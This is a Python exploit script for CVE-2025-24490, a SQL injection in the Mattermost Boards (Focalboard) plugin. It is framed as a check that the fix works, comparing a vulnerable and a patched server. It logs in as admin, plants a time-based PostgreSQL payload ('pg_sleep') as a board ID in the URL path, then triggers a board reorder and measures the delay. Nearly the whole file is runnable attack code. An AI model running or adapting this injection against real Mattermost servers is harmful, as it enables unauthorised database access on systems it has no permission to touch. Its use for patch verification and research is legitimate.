#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Mattermost Boards Plugin — Fix Verification (Vulnerable vs Patched)
# CVE            : CVE-2025-24490
# Vendor         : Mattermost
# Product        : Mattermost Server (Boards / Focalboard Plugin)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-24490 — Fix verification: side-by-side comparison.

Tests the board ID injection path (Vector 2) to isolate the SQL
parameterization fix. Compares timing on vulnerable vs patched.

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24490
    - https://github.com/advisories/GHSA-p4jg-qmjv-9x26
"""

import json
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

ADMIN_USER = "admin"
ADMIN_PASS = "Admin123!@#"

# Shorter sleep for cleaner comparison
SQLI_PAYLOAD = "'||(SELECT '' FROM pg_sleep(3))||'"


def make_request(url, method="GET", data=None, headers=None, timeout=30):
    if headers is None:
        headers = {}
    if data is not None and isinstance(data, (dict, list)):
        data = json.dumps(data).encode('utf-8')
        if 'Content-Type' not in headers:
            headers['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    start = time.time()
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        elapsed = time.time() - start
        body = resp.read().decode('utf-8', errors='replace')
        return resp.status, body, elapsed
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start
        body = e.read().decode('utf-8', errors='replace')
        return e.code, body, elapsed
    except Exception as e:
        elapsed = time.time() - start
        return 0, str(e), elapsed


def login(base_url):
    data = json.dumps({"login_id": ADMIN_USER, "password": ADMIN_PASS}).encode('utf-8')
    req = urllib.request.Request(
        f"{base_url}/api/v4/users/login",
        data=data,
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    resp = urllib.request.urlopen(req)
    token = resp.headers.get('Token')
    body = json.loads(resp.read().decode('utf-8'))
    return token, body['id']


def get_auth_headers(token):
    return {
        "Authorization": f"Bearer {token}",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json"
    }


def test_board_reorder_injection(base_url, label):
    """Test board ID SQLi via URL path → reorder"""
    print(f"\n{'='*60}")
    print(f"  Testing: {label}")
    print(f"  Target: {base_url}")
    print(f"{'='*60}")

    try:
        token, user_id = login(base_url)
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return None

    headers = get_auth_headers(token)

    # Get team
    status, body, _ = make_request(f"{base_url}/api/v4/users/me/teams", headers={"Authorization": f"Bearer {token}"})
    teams = json.loads(body)
    team_id = teams[0]['id']
    print(f"[+] Team: {team_id}")

    # Create category
    cat_name = f"fix-verify-{int(time.time())}"
    status, body, _ = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories",
        method="POST",
        data={"name": cat_name, "userID": user_id, "teamID": team_id, "type": "custom"},
        headers=headers
    )
    cat_data = json.loads(body)
    category_id = cat_data['id']
    print(f"[+] Category: {category_id} (name: {cat_name})")

    # Add board with SQLi payload via URL path
    encoded = urllib.parse.quote(SQLI_PAYLOAD, safe='')
    url = f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories/{category_id}/boards/{encoded}"
    status_add, body_add, _ = make_request(url, method="POST", headers=headers)
    print(f"[*] Add board (SQLi payload): HTTP {status_add}")

    if status_add != 200:
        print(f"    Server rejected board ID: {body_add[:100]}")
        return {"status_add": status_add, "status_reorder": None, "elapsed": 0}

    # Get boards in category
    status, body, _ = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories",
        headers=headers
    )
    categories = json.loads(body)
    board_ids = []
    for c in categories:
        if c['id'] == category_id:
            board_ids = [bm['boardID'] for bm in c.get('boardMetadata', [])]
            break

    if not board_ids:
        print("[-] No boards found in category")
        return {"status_add": status_add, "status_reorder": None, "elapsed": 0}

    print(f"[*] Board IDs in category: {board_ids}")

    # Trigger reorder - this is where the SQL injection would fire
    print(f"[*] Triggering board reorder...")
    status_r, body_r, elapsed = make_request(
        f"{base_url}/plugins/focalboard/api/v2/teams/{team_id}/categories/{category_id}/boards/reorder",
        method="PUT",
        data=board_ids,
        headers=headers,
        timeout=15
    )
    print(f"    Reorder: HTTP {status_r}, elapsed: {elapsed:.2f}s")

    result = {"status_add": status_add, "status_reorder": status_r, "elapsed": elapsed}

    if elapsed > 2:
        print(f"[!!!] TIMING DELAY: {elapsed:.2f}s — SQL injection likely executed!")
    else:
        print(f"[+] No timing delay — SQL injection NOT executed")

    return result


def main():
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <vuln_host> <vuln_port> <patched_host> <patched_port>")
        sys.exit(1)

    vuln_url = f"http://{sys.argv[1]}:{sys.argv[2]}"
    patched_url = f"http://{sys.argv[3]}:{sys.argv[4]}"

    print("=" * 70)
    print("  CVE-2025-24490 FIX VERIFICATION")
    print(f"  Vulnerable: {vuln_url}")
    print(f"  Patched:    {patched_url}")
    print(f"  Payload:    {SQLI_PAYLOAD}")
    print("=" * 70)

    vuln_result = test_board_reorder_injection(vuln_url, "VULNERABLE (9.11.7)")
    patched_result = test_board_reorder_injection(patched_url, "PATCHED (9.11.8)")

    print("\n" + "=" * 70)
    print("  COMPARISON RESULTS")
    print("=" * 70)

    if vuln_result:
        v_elapsed = vuln_result['elapsed']
        v_status = vuln_result['status_reorder']
        print(f"  Vulnerable: HTTP {v_status}, elapsed {v_elapsed:.2f}s", end="")
        if v_elapsed > 2:
            print(" ← SQL INJECTION CONFIRMED")
        else:
            print(" (no injection — may need different approach)")

    if patched_result:
        p_elapsed = patched_result['elapsed']
        p_status = patched_result['status_reorder']
        print(f"  Patched:    HTTP {p_status}, elapsed {p_elapsed:.2f}s", end="")
        if p_elapsed > 2:
            print(" ← SQL INJECTION STILL WORKS (BYPASS!)")
        else:
            print(" ← SQL INJECTION BLOCKED (FIX EFFECTIVE)")

    print("=" * 70)


if __name__ == "__main__":
    main()
